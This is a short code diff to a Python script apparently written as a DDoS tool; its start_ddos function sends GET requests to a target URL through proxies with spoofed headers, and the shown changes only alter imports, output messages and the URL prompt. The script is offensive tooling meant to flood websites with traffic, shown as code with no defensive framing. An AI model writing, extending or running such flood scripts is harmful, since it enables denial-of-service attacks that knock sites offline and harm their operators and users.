@@ -2,6 +2,7 @@
 # -*- coding: utf-8  -*-
 import requests as r, fake_headers
 import os 
+import sys
 import threading
 import random
 import click
@@ -77,7 +78,7 @@ def start_ddos(prox, url, headers, proxies, color):
 		s = r.Session()
 		req = s.get(url, headers=headers, proxies=proxies)
 		if req.status_code == 200:
-			print(color+"⚡ GET {} \033[36m-> proxy".format(prox))
+			print(color+"💥 Get-start: {} \033[36m-> proxy".format(prox))
 	except:
 		pass
 
@@ -87,7 +88,7 @@ def start_ddos(prox, url, headers, proxies, color):
 def main(proxy, url):
 	
 	if url == None:
-		url = input("URL: ")
+		url = input("\033[36m=> URL: ")
 	if url[:4] != "http":
 		print(Fore.RED+"Enter the full URL (example: http*://****.**/)"+Style.RESET_ALL)
 		exit()
